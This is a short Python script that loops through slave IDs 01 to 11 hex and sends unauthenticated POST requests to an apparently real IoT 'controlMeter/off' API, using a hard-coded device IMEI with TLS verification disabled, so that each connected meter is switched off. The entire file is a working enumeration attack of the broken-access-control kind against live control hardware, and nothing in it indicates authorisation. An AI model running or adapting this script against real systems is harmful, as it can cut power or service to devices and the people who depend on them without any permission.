import requests
import urllib3

urllib3.disable_warnings()

URL = "https://hubtcp.aliste.io/v1/controlMeter/off"
IMEI = "863852069494870"

headers = {
    "Content-Type": "application/json"
}

for slave in range(0x01, 0x12):   # 01–11 hex (1–17 decimal)
    slave_hex = f"{slave:02X}"
    slave_id = f"000000{slave_hex}"

    payload = {
        "imei": IMEI,
        "slaveId": slave_id
    }

    try:
        r = requests.post(
            URL,
            json=payload,
            headers=headers,
            verify=False,
            timeout=10
        )

        print(
            f"slaveId={slave_id} | status={r.status_code} | response={r.text}"
        )

    except Exception as e:
        print(f"slaveId={slave_id} | ERROR: {e}")